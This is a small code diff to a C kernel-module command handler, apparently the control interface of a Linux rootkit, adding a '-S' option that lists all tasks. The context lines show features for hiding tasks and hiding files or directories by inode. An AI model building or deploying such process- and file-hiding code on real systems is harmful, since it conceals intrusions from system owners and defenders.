@@ -491,6 +491,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             /* list hidden tasks */
         } else if(!strcmp(buf, "-s")) {
             kv_show_saved_tasks();
+            /* list ALL tasks */
+        } else if(!strcmp(buf, "-S")) {
+            kv_show_all_tasks();
             /* hide file/directory based on inode */
         } else if(!strncmp(buf, "-a", MIN(2, size))) {
             char *s = &buf[3];
